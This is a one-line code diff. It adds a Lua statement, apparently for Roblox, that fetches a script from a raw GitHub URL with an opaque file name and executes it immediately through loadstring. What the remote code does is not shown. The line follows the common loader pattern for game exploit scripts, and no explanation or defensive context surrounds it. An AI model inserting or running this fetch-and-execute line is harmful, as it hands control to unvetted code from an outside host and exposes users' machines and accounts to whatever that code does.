@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kademboss/maddyhure/main/fe3feafeaefa"))()
